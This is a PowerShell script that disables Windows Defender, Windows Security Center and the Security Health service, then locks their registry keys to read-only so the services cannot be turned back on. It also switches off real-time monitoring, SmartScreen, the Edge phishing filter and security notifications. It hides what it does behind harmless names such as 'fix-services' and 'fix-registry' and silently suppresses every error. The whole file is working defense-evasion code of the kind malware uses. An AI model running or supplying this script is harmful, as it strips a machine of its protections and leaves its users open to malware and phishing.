function Set-Registry-ReadOnly($regpath) {
    $acl = Get-Acl $regpath
    $acl.SetAccessRuleProtection($True, $True)
    foreach ($a in $acl.Access) {
        Try{
            $u=$a.IdentityReference
            $propagation = $a.PropagationFlags
            $rule = New-Object System.Security.AccessControl.RegistryAccessRule($u, "ReadKey", @("ObjectInherit","ContainerInherit"), "None", "Allow")
            $acl.PurgeAccessRules($u)
            $acl.SetAccessRule($rule)
        }
       Catch {}
    }
    Try{
        Set-Acl -ErrorAction SilentlyContinue $regpath $acl | out-null;
    }
    Catch {}
}

$bservices = @(
    "wscsvc*" #WSCSVC (Windows Security Center)
    "SecurityHealthService*" #Windows Security Health Servce
    "WinDefend*" #Windows Defender Service
)

function fix-services() {
    foreach ($bservice in $bservices) {
        Set-ItemProperty -ErrorAction SilentlyContinue "HKLM:\SYSTEM\CurrentControlSet\Services\$bservice" "Start" 4
        Set-Registry-ReadOnly "HKLM:\SYSTEM\CurrentControlSet\Services\$bservice"
    }
}

function fix-registry() {
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f| out-null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f| out-null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f| out-null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f| out-null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d "0" /f| out-null
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f| out-null
    reg add "HKCU\SOFTWARE\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f| out-null
    reg add "HKCU\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f| out-null
    reg add "HKCU\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\PhishingFilter" /v "PreventOverride" /t REG_DWORD /d "0" /f| out-null
    reg add "HKCU\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge.stable_8wekyb3d8bbwe\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f| out-null
    reg add "HKCU\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge.stable_8wekyb3d8bbwe\MicrosoftEdge\PhishingFilter" /v "PreventOverride" /t REG_DWORD /d "0" /f| out-null
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost\EnableWebContentEvaluation" /v "Enabled" /t REG_DWORD /d "0" /f| out-null
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost\EnableWebContentEvaluation" /v "PreventOverride" /t REG_DWORD /d "0" /f| out-null
    reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f| out-null
}

fix-services
fix-registry
